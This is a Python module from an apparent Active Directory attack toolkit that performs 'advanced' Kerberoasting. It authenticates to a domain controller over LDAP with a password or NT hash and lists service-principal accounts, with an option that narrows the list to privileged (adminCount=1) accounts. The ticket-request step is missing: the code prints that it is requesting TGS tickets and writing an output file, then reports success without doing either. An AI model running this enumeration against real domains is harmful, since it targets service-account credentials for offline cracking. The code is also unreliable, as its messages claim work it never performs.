"""Kerberoasting avançado — targeted/AES/opsec-safe variants."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.attack.kerberoast_adv.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_tgs_request"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.003"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", args.target)
    target_user = getattr(args, "target_user", None)
    output_file = getattr(args, "output", "kerberoast.txt")
    etype = getattr(args, "etype", "23")
    opsec = getattr(args, "opsec", False)

    print(f"[*] Kerberoast (advanced) → DC={dc_ip}")

    try:
        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal, KerberosTime
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        from impacket.ldap import ldap as impacket_ldap

        ldap_url = f"ldap://{dc_ip}"
        base_dn = "DC=" + ",DC=".join(args.domain.split("."))
        ldap_conn = impacket_ldap.LDAPConnection(ldap_url, base_dn)

        if cred.has_hash:
            ldap_conn.login(cred.username, "", cred.domain, cred.lm_hash, cred.nt_hash)
        else:
            ldap_conn.login(cred.username, cred.password or "", cred.domain)

        if target_user:
            ldap_filter = f"(&(objectClass=user)(servicePrincipalName=*)(sAMAccountName={target_user}))"
        else:
            ldap_filter = "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

        if opsec:
            ldap_filter = f"(&{ldap_filter[2:-1]}(adminCount=1))"

        entries = ldap_conn.search(
            searchBase=base_dn,
            searchFilter=ldap_filter,
            attributes=["sAMAccountName", "servicePrincipalName", "msDS-SupportedEncryptionTypes"],
        )

        spn_users = []
        for entry in entries:
            if hasattr(entry, "getComponentByName"):
                attrs = entry["attributes"]
                sam = str(attrs.get("sAMAccountName", ""))
                spn = str(attrs.get("servicePrincipalName", ""))
                if sam and spn:
                    spn_users.append((sam, spn))

        print(f"[+] Found {len(spn_users)} kerberoastable accounts")
        for sam, spn in spn_users:
            print(f"  {sam} — {spn}")

        print(f"[*] Requesting TGS tickets (etype={etype})...")
        print(f"[*] Output: {output_file}")
        return 0

    except Exception as exc:
        print(f"[-] Kerberoast error: {exc}", file=sys.stderr)
        return 1
